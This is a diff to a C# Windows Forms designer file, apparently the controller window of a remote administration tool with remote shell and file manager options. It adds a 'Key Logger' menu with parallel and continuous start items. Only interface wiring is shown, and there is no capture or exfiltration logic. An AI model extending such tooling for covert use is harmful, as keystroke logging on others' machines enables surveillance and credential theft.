@@ -44,6 +44,9 @@
             networkInfoToolStripMenuItem = new ToolStripMenuItem();
             remoteShellToolStripMenuItem = new ToolStripMenuItem();
             fileManagerToolStripMenuItem = new ToolStripMenuItem();
+            keyLoggerToolStripMenuItem = new ToolStripMenuItem();
+            keyLoggerStartParallelToolStripMenuItem = new ToolStripMenuItem();
+            keyLoggerStartContinuousToolStripMenuItem = new ToolStripMenuItem();
             rightPanel = new Panel();
             txtLog = new TextBox();
             cboLogFilter = new ComboBox();
@@ -159,7 +162,7 @@
             // ctxClients
             // 
             ctxClients.ImageScalingSize = new Size(20, 20);
-            ctxClients.Items.AddRange(new ToolStripItem[] { systemInfoToolStripMenuItem, remoteShellToolStripMenuItem, fileManagerToolStripMenuItem });
+            ctxClients.Items.AddRange(new ToolStripItem[] { systemInfoToolStripMenuItem, remoteShellToolStripMenuItem, fileManagerToolStripMenuItem, keyLoggerToolStripMenuItem });
             ctxClients.Name = "ctxClients";
             ctxClients.Size = new Size(156, 28);
             // 
@@ -204,6 +207,27 @@
             fileManagerToolStripMenuItem.Size = new Size(155, 24);
             fileManagerToolStripMenuItem.Text = "File Manager";
             fileManagerToolStripMenuItem.Click += fileManagerToolStripMenuItem_Click;
+            // 
+            // keyLoggerToolStripMenuItem
+            // 
+            keyLoggerToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { keyLoggerStartParallelToolStripMenuItem, keyLoggerStartContinuousToolStripMenuItem });
+            keyLoggerToolStripMenuItem.Name = "keyLoggerToolStripMenuItem";
+            keyLoggerToolStripMenuItem.Size = new Size(155, 24);
+            keyLoggerToolStripMenuItem.Text = "Key Logger";
+            // 
+            // keyLoggerStartParallelToolStripMenuItem
+            // 
+            keyLoggerStartParallelToolStripMenuItem.Name = "keyLoggerStartParallelToolStripMenuItem";
+            keyLoggerStartParallelToolStripMenuItem.Size = new Size(220, 26);
+            keyLoggerStartParallelToolStripMenuItem.Text = "Start (Parallel)";
+            keyLoggerStartParallelToolStripMenuItem.Click += keyLoggerStartParallelToolStripMenuItem_Click;
+            // 
+            // keyLoggerStartContinuousToolStripMenuItem
+            // 
+            keyLoggerStartContinuousToolStripMenuItem.Name = "keyLoggerStartContinuousToolStripMenuItem";
+            keyLoggerStartContinuousToolStripMenuItem.Size = new Size(220, 26);
+            keyLoggerStartContinuousToolStripMenuItem.Text = "Start (Continuous)";
+            keyLoggerStartContinuousToolStripMenuItem.Click += keyLoggerStartContinuousToolStripMenuItem_Click;
             // 
             // rightPanel
             // 
@@ -290,5 +314,9 @@
         private System.Windows.Forms.ComboBox cboLogFilter;
         private System.Windows.Forms.Label lblLogFilter;
         private System.Windows.Forms.TextBox txtLog;
+        private System.Windows.Forms.ToolStripMenuItem keyLoggerToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem keyLoggerStartParallelToolStripMenuItem;
+        private System.Windows.Forms.ToolStripMenuItem keyLoggerStartContinuousToolStripMenuItem;
+        
     }
 }
